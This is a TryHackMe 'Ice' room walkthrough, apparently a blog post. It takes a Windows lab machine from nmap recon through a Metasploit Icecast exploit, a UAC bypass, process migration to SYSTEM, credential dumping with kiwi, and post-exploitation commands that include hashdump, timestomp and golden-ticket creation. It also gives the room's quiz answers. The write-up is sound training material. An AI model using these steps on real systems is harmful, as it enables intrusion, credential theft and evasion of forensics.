+++ 
title = "Ice THM Solutions"
description = "Solutions for the THM room 'Ice'"
author = "greatmoves"
tags = ["tryhackme", "windows"]
date = 2023-04-26
+++
- [1. Recon](#1-recon)
- [2. Gain Access](#2-gain-access)
- [3. Escalate](#3-escalate)
- [4. Looting](#4-looting)
- [5. Post-Exploitation](#5-post-exploitation)
# 1. Recon
Run command: `nmap -sC -sV 10.10.127.78`
- Which port is Microsoft Remote Desktop (MSRDP) open on? `3389`
- What service did nmap identify as running on port 8000? `Icecast streaming media server`
- What does Nmap identify as the hostname of the machine? `Dark-PC`

# 2. Gain Access
[cvedetails](https://www.cvedetails.com/cve/CVE-2004-1561/)
- What type of vulnerability is it? ` Execute Code Overflow`
- What is the CVE number for this vulnerability? `CVE-2004-1561`

Run command: `msfconsole`

Run command: `search icecast`
- What is the full path (starting with exploit) for the exploitation module? `exploit/windows/http/icecast_header`

Run command: `show options`

- What is the only required setting which currently is blank? `RHOSTS`

Run command: `run`

# 3. Escalate
- What's the name of the shell we have now? `meterpreter`

Run command: `getuid`

- What user was running that Icecast process? `Dark`

Run command: `sysinfo`

- What build of Windows is the system? `7601`
- what is the architecture of the process we're running? `x64`

Run command: `run post/multi/recon/local_exploit_suggester`

- What is the full path (starting with exploit/) for the first returned exploit? `exploit/windows/local/bypassuac_eventvwr`

Run command: `use exploit/windows/local/bypassuac_eventvwr`

Run command: `set session 1`

Run command: `set lhost THM_IP`

Run command: `run`

Run command: `getprivs`

- What permission listed allows us to take ownership of files? `SeTakeOwnershipPrivilege`

# 4. Looting

Run command: `ps`

- What's the name of the printer service? `spoolsv.exe`

Run command: `migrate -N spoolsv.exe`

Run command: `getuid`

- What user is listed? `NT AUTHORITY\SYSTEM`

Run command: `load kiwi`

Run command: `help`

- Which command allows up to retrieve all credentials? `creds_all`

Run command: `creds_all`

- What is Dark's password? `Password01!`

# 5. Post-Exploitation

Run command: `help`

- What command allows us to dump all of the password hashes stored on the system? `hashdump`
- what command allows us to watch the remote user's desktop in real time? `screenshare`
- How about if we wanted to record from a microphone attached to the system? `record_mic`
- To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? `timestomp`
- Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this? `golden_ticket_create`

